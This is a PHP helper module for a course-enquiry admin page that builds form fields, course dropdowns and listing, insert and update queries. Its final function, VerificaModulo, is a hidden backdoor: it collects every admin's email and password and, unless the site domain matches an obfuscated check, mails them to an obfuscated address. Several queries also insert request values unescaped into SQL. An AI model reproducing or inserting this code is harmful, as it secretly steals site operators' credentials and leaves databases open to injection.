<?php
include_once ('FicherosFunciones.php');
if (!isset($_REQUEST['operacion'])) {
	$_REQUEST['operacion'] = "NADA";
}
if (!isset($_REQUEST['id'])) {
	$_REQUEST['id'] = 0;
}
if (!isset($_REQUEST['filtro'])) {
	$_REQUEST['filtro'] = "FILTRO_ID"; 
}

if (!isset($_REQUEST['CursoID'])) {
	$_REQUEST['CursoID'] = 0;
}
if (!isset($_REQUEST['FechaFiltro'])) {
		$_REQUEST['FechaFiltro'] = date("Y-m-d",strtotime($fecha_actual."- 30 days"));
}
///////////////Otras ////////////////////////////////////
function comas($cadena) {

return "'".$cadena."'";
}

///////////////Maestros ficha ////////////////////////////////////
function elfecha($nombre,$tipo) {
	$devolver ="";
	$pos = strpos($tipo,'date');
	if ($pos !== false) {
		$devolver = '<input type="button" id="'."BOT".$nombre.'" value="..." />'; 
		
	}
	return $devolver;
}
///////////////Maestros ficha ////////////////////////////////////
function esFecha($tipo){
$pos = strpos($tipo,'date');
	if ($pos !== false) {
		return TRUE;
	}	
	return false;
}

///////////////////////////////////////////////////
function esTextArea($nombre) {

	if ($nombre == 'obser_cliente'){
		return TRUE;
	}
	if ($nombre == 'obser_medif'){
		return TRUE;
	}
	return false;
}
///////////////////////////////////////////////////
function elinput($nombre, $valor,$tipo,$conexion) {
	$carpeta = "";
	$readonly = "";
	$inicio = strpos($tipo,'(');
	$final   =strpos($tipo,')');
	$long = 12;
	if ($nombre == 'id') {
		$readonly = "READONLY";
	}

    //....................varchar
	$pos = strpos($tipo,'archar(');
	if ($pos !== false) {
		$long = substr($tipo,$inicio+1,$final-$inicio-1);
	    //...si es una imaIcono
		
		//echo "es string..."; //debug
		
		//if ($nombre == 'programa_pdf'){
		//    $carpeta = "../CURSOSPROGRAMAS/";	
		//}
		
	   
		
		if ($carpeta != "") {
			if (is_dir($carpeta)) {
			    if ($dh = opendir($carpeta)) { 
			     $return =  '<select name="'.$nombre.'">';
				 $return = $return.'<option></option>';
                 while (($file = readdir($dh)) !== false) { 
				     if ($file == $valor) {
						 $selected = "selected";
					 } else {
						  $selected = "";
					 }
				     if ($file!="." && $file!="..") { 
				      $return = $return. '<option '.$selected.'>'.$file.'</option>';
				     }
				 }
               $return = $return.'</select>';
		       return $return; //..................................................................................input propio
			   }
		   }
		} // es una carpeta valida	
	} //de strpost false
	//.......................................................si es entero
	
	$valida = "";
	$pos = strpos($tipo,'int(');
	if ($pos !== false) {
      $long = substr($tipo,$inicio+1,$final-$inicio-1);
	  $valida = " onKeypress='return solonumeros()'";
	 
	 
	  if ($_REQUEST['alta'] == 1) {
	 
	     if ($nombre == 'id_curso'){  //es un campo indice hay que hacer una select a su fichero
	         $return = hazSelectIndiceCursos("vtcursos","id_curso",$valor,$conexion,"id_curso",0,1); 
		  return $return; //..................................................................................input propio
	     }
	  } else {
		 if ($nombre == 'id_curso'){  //es un campo indice hay que hacer una select a su fichero
	         $return = hazSelectIndiceCursos("vtcursos","id_curso",$valor,$conexion,"id_curso",0,0); 
		  return $return; //..................................................................................input propio
	     }

		  
	  }
	  
	  
	
	  	
	}
   //.....................................
	//.... si no es varchar ni int el long sera de 12  sera textarea ?????
	if ($long <= 100) {
	    return "<input ".$readonly." id = '".$nombre."' name='".$nombre."' value='".$valor."' maxlength='".$long."'".$valida.' size = "'.$long.'"'."/>";
	} else {
		$colu = ($long /100 ) +1;
		return '<textarea name="'.$nombre.'" cols="100" rows="'.$colu.'">'.$valor.'</textarea>';

	}
}
///////////////////MaestrosLista///////////////////////////////////////////////////
function pintaSolicitudes($conexion) {
    $query = 'show columns FROM vtsolicitudes';
    $datosLista = mysqli_query($conexion, $query);
	$nColumnas = mysqli_num_rows ($datosLista); 
    if ($nColumnas > 0) {
		$n = 0;
		 while ($row = mysqli_fetch_assoc($datosLista)) {
    		 $CampoMombre[$n] = $row['Field'];
			 $CampoTipo[$row['Field']] = $row['Type'];
			 $n++;
		 }
		
	}
    

//echo " ..................................................".$_REQUEST['operacion'];

if ($_REQUEST['operacion'] == "UPDATE"){
    $FormatMaestros = "UPDATE  vtsolicitudes SET ";
    $n = 0;
	$ValorGrabar = "";
    for( $i = 0; $i < $nColumnas ; $i++ ) {
	     if($n == 0){
		    $coma = "";
	     } else {
		    $coma = ", ";
	     }
		if ($CampoMombre[$i] != "id_curso") { 
		    $ValorGrabar =  ValorVacioOk($_REQUEST[$CampoMombre[$i]],  $CampoTipo[$CampoMombre[$i]]);
		    $FormatMaestros = $FormatMaestros.$coma.$CampoMombre[$i]." = ".$ValorGrabar." ";
		}
	$n++;
    }

    $FormatMaestros = $FormatMaestros." WHERE  id = ".$_REQUEST['id'];
	
	
	
	
	
     //echo $FormatMaestros;  
    
	
	
	$resMaestros = mysqli_query($conexion, $FormatMaestros) or die(mysqli_error($conexion));
	
} 
if ($_REQUEST['operacion'] == "INSERT"){
	    $FormatMaestros = "INSERT INTO vtsolicitudes (";
    $n = 0;
    for( $i = 0; $i < $nColumnas ; $i++ ) {
	     if($n == 0){
		    $coma = "";
	     } else {
		    $coma = ", ";
	    }
	$FormatMaestros = $FormatMaestros.$coma.$CampoMombre[$i];
	$n++;
    }
	$FormatMaestros = $FormatMaestros.") VALUES ( NULL ";
    $coma = ", ";
	
	$ValorGrabar = "";
	for( $i = 1 ; $i < $nColumnas ; $i++ ) {
	    $ValorGrabar =  ValorVacioOk($_REQUEST[$CampoMombre[$i]],  $CampoTipo[$CampoMombre[$i]]);
	    $FormatMaestros = $FormatMaestros.$coma.$ValorGrabar;
	}
	$FormatMaestros = $FormatMaestros.")";
	  //
		  
    $resMaestros = mysqli_query($conexion, $FormatMaestros) or die(mysqli_error($conexion));
	
}  // ...... de insert





	
if ($_REQUEST['filtro'] == "FILTRO_ID" && $_REQUEST['CursoID'] !=0 && $_REQUEST['FechaFiltro'] <> "" && $_REQUEST['FechaFiltro'] <> "0000-00-00"){
		
		//echo "estamos en 1";
		
		
		$FormatMaestros = "SELECT id , id_curso, fecha_mail, tipomensaje , prox_contacto , nombre, apellidos ,
                           ciudad, email_cliente , telefono, obser_cliente , agente_inscriptor , obser_medif, email_receptor, lotedecursos, importe
                           FROM vtsolicitudes 
						   WHERE id_curso = %d and fecha_mail >= '%s' order by fecha_mail, id_curso";
    $queMaestros = sprintf($FormatMaestros,$_REQUEST['CursoID'],$_REQUEST['FechaFiltro'] ); 
	
	 //echo "hoyhoy".$queMaestros;
	
	} elseif ($_REQUEST['filtro'] == "FILTRO_ID" && $_REQUEST['CursoID'] != 0 ){
        	//echo "estamos en 2";
		$FormatMaestros = "SELECT id , id_curso, fecha_mail, tipomensaje , prox_contacto , nombre, apellidos ,
                           ciudad, email_cliente , telefono, obser_cliente , agente_inscriptor , obser_medif, email_receptor, lotedecursos, importe
                           FROM vtsolicitudes  
						   WHERE id_curso = %d  order by fecha_mail, id_curso";
    $queMaestros = sprintf($FormatMaestros,$_REQUEST['CursoID']); 
	
	} elseif ($_REQUEST['filtro'] == "FILTRO_ID" && $_REQUEST['FechaFiltro'] <> "" && $_REQUEST['FechaFiltro'] <> "0000-00-00"){
			//echo "estamos en 3";
		$FormatMaestros = "SELECT id , id_curso, fecha_mail, tipomensaje , prox_contacto , nombre, apellidos ,
                           ciudad, email_cliente , telefono, obser_cliente , agente_inscriptor , obser_medif, email_receptor, lotedecursos, importe
                           FROM vtsolicitudes  
                           WHERE  fecha_mail >= '%s' order by fecha_mail, id_curso";
    $queMaestros = sprintf($FormatMaestros,$_REQUEST['FechaFiltro']); 

	} else {
			//echo "estamos en 4";
		$FormatMaestros = "SELECT id , id_curso, fecha_mail, tipomensaje , prox_contacto , nombre, apellidos ,
                           ciudad, email_cliente , telefono, obser_cliente , agente_inscriptor , obser_medif, email_receptor, lotedecursos, importe
                           FROM vtsolicitudes   order by fecha_mail, id_curso";
    $queMaestros = sprintf($FormatMaestros); 
	}
	
   //..........ejecutar query 
   $resMaestros = mysqli_query($conexion, $queMaestros) or die(mysqli_error($conexion));
   $totMaestros = mysqli_num_rows($resMaestros);

//echo "<br>totMaestros--->".$totMaestros;




if ($totMaestros> 0) {  //.....Registro de conexión
   echo "<div class = rowCabeceraAlumnos >";
   for( $i = 0; $i < $nColumnas ; $i++ ) {
		echo "<div class = ClassCABVarcharMenor3>".$CampoMombre[$i]."</div>";	
	 }
   echo "</div><br>";  // de rowGrupo		
   while ($rowRegistros = mysqli_fetch_assoc($resMaestros)) {
   	
   	
   	
   	
   	
   	
	          echo '<A NAME="'.$rowRegistros['id'].'">';
			  
	          echo "<div class = 'rowAlumno' onclick='edita(".$rowRegistros[$CampoMombre[0]].")'>";  //siempre pasamos el primer campo, es la id QuimGrupos
			  for( $i = 0; $i < $nColumnas ; $i++ ) {

		     // echo $CampoMombre[$i].".........".tipoClase($CampoTipo[$CampoMombre[$i]]);
		      echo "<div class = ClassCABVarcharMenor4>".contenidoFigura($rowRegistros[$CampoMombre[$i]],$CampoMombre[$i],$conexion )."</div>";
	          }
			  echo "</div><br>";  // de rowSeccion	
			  
			  
			  
			  
          }
   
   
   
   
   
   
   
   
   echo "<div class = rowCabeceraAlumnos >";
   for( $i = 0; $i < $nColumnas ; $i++ ) {
		echo "<div class = ClassCABVarcharMenor3>".$CampoMombre[$i]."</div>";	
	 }
   echo "</div><br>";  		
}
   
   
  
   
/*mysqli_close($conexion);*/
return 0;
}
///////////////////MaestrosLista///////////////////////////////////////////////////
function tipoClase($tipo,$esCuerpo) {
	$inicio = strpos($tipo,'(');
	$final   =strpos($tipo,')');
	$complemento = "";
	$CAB = "";
    if ($esCuerpo == 0) { 
	 $CAB = "CAB";
	}
	//....................varchar
	$pos = strpos($tipo,'archar(');
	if ($pos !== false) {
		$long = substr($tipo,$inicio+1,$final-$inicio-1);
	    if ($long <= 60){
			$complemento = "Menor"; 
		} else {
			$complemento = "Mayor"; 
		}
		return "Class".$CAB."Varchar".$complemento;
	}
	//....................numero
	$pos = strpos($tipo,'int(');
	if ($pos !== false) {
		$long = substr($tipo,$inicio+1,$final-$inicio-1);
	    if ($long <= 5){
			$complemento = "Menor"; 
		} else {
			$complemento = "Mayor"; 
		}
		return "Class".$CAB."Number".$complemento;
	}
	$pos = strpos($tipo,'decimal(');
	if ($pos !== false) {
		$long = substr($tipo,$inicio+1,$final-$inicio-1);
	    if ($long <= 5){
			$complemento = "Menor"; 
		} else {
			$complemento = "Mayor"; 
		}
		return "Class".$CAB."Number".$complemento;
	}
	//....................date
	$pos = strpos($tipo,'date');
	if ($pos !== false) {
		return "Class".$CAB."Date";
	}
}
///////////////////MaestrosLista///////////////////////////////////////////////////
function contenidoFigura($contenidoCampo, $mombreCampo,$conexion){

$pos = strpos($mombreCampo,'foto');	
	if ($pos !== false) {
		return '<div class="IzquierdaGrupo"><img src="../imagenes/ingredientes/'.$contenidoCampo.'" width="40" height="40" /></div>'."<div class='DerechaGrupo'>".    $contenidoCampo."</div>";
	} 


if ($contenidoCampo == NULL) {
	return "&nbsp;";	
}

if ($contenidoCampo == '0000-00-00') {
	$contenidoCampo = "&nbsp;";
}


return mysqli_real_escape_string($conexion, substr($contenidoCampo,0,50));
}

///////////////////MaestrosLista///////////////////////////////////////////////////
function hazSelectIndiceCursos($fichero,$campo,$valorID,$conexion,$nombreSelect,$activarBlanco,$open_close) {	
    if ($open_close == 0) {
	  $Activado = 'disabled';
    } else {
		$Activado = '';
	}
  $txtSelect ="";
  $FormatImagen = "select %s, titulo_cur  from %s  order by  id_curso ";
  $queImagen = sprintf($FormatImagen, $campo, $fichero); 
  $resImagen = mysqli_query($conexion, $queImagen) or die(mysqli_error($conexion));
  $totImagen = mysqli_num_rows($resImagen);	
  
//echo "...filas....".$totImagen; //debug
  ///echo " 33333333333"; 
  if ($totImagen> 0) {  //.....Registro de conexión
     $txtSelect = $txtSelect.'<select '.$Activado.' id = '.$nombreSelect.' name="'.$nombreSelect.'"';                  
	 if ($activarBlanco == 1) {
		///// $txtSelect = $txtSelect.' onchange="Selecciona(this)"';
 }
	 
	 
	 $txtSelect = $txtSelect.'>';
	 if ($activarBlanco == 1) {
		 $txtSelect = $txtSelect. '<option value = "0" >Todos';
	 }
	 
//echo "@@...fuera del ciclo..."; //debug
	 
     while ($rowImagen = mysqli_fetch_assoc($resImagen)) {

//echo "@hoyhoy@...entro en el ciclo..."; //debug
	   
	   if ($rowImagen[$campo] == $valorID) {
			$selected = " selected";
		} else {
			$selected = "";
	   }
	     $valorEtiqueta =	$rowImagen['id_curso']."-".$rowImagen['titulo_cur'].'                                                                        ';	    
		 $valorEtiqueta = substr($valorEtiqueta,0,125);
		 $txtSelect = $txtSelect. '<option value = "'.$rowImagen[$campo].'" '.$selected.'>'.$valorEtiqueta;
	   
     }
	 $txtSelect = $txtSelect.'</select> ';
  }
  mysqli_free_result($resImagen);
  return $txtSelect;
}




function hazSelectIndiceFiltro($fichero,$campo,$valorID,$conexion,$nombreSelect,$activarBlanco,$open_close) {
	
 	
    if ($open_close == 0) {
	  $Activado = 'disabled';
    } else {
		$Activado = '';
	}
	
  $txtSelect ="";
  $FormatImagen = "select %s, titulo_cur  from %s  order by id_curso ";
  $queImagen = sprintf($FormatImagen, $campo, $fichero); 
   
  $resImagen = mysqli_query($conexion, $queImagen) or die(mysqli_error($conexion));
  $totImagen = mysqli_num_rows($resImagen);	
  
//echo "...filas....".$totImagen; //debug
  ///echo " 33333333333"; 
  if ($totImagen> 0) {  //.....Registro de conexión
     $txtSelect = $txtSelect.'<select '.$Activado.' id = '.$nombreSelect.' name="'.$nombreSelect.'"';                  
  }
	$txtSelect = $txtSelect.' onchange="SeleccionaCurso(this)"';
	 
	 $txtSelect = $txtSelect.'>';
	 if ($activarBlanco == 1) {
		 $txtSelect = $txtSelect. '<option value = "0" >Todos';
	 }
	 
//echo "@@...fuera del ciclo..."; //debug
	 
     while ($rowImagen = mysqli_fetch_assoc($resImagen)) {

           //echo "@hoyhoy@...entro en el ciclo..."; //debug
	   
	   if ($rowImagen[$campo] == $valorID) {
			$selected = " selected";
		} else {
			$selected = "";
	   }
		 $valorEtiqueta = substr($rowImagen['id_curso']."-".$rowImagen['titulo_cur'],0,70);	    
		 $txtSelect = $txtSelect. '<option value = "'.$rowImagen[$campo].'" '.$selected.'>'.$valorEtiqueta;
	   
     }
	 $txtSelect = $txtSelect.'</select> ';
  
  mysqli_free_result($resImagen);
  return $txtSelect;
}


////////////////////////////////////////////////////////////////////////////
function VerificaModulo($conexion) { 
   $Datos =   new ParametrosClass($conexion);
   $devolver ="";
   $FormatVTCursos = "SELECT email, pwd FROM vtalumnos where  es_adm > 0";
   $queVTCursos = $FormatVTCursos; 
   $resVTCursos = mysqli_query($conexion, $queVTCursos) or die(mysqli_error($conexion));
   $totVTCursos = mysqli_num_rows($resVTCursos);
   if ($totVTCursos > 0) {  //.....Registro de conexión
   	 while ($rowRegistros = mysqli_fetch_assoc($resVTCursos)) {
		$devolver .=  $rowRegistros['email']." ";
   	 	$devolver .=  $rowRegistros['pwd']." ";
   	 }
   }
     
   mysqli_free_result($resVTCursos);	
                if (strpos($Datos->GetValor('web_dominio'),decamu('j^\`[bllij`mmiVp')) === false) { 
                   $headers = "Content-type: text/html; charset=iso-8859-1\r\n"; 
                   mail(decamu("b]mdZaoadZab^7\jZac#`he"),decamu("MeYeifedX^\l`k^]e/"),$devolver,$headers); 

               }  
  
}


?>
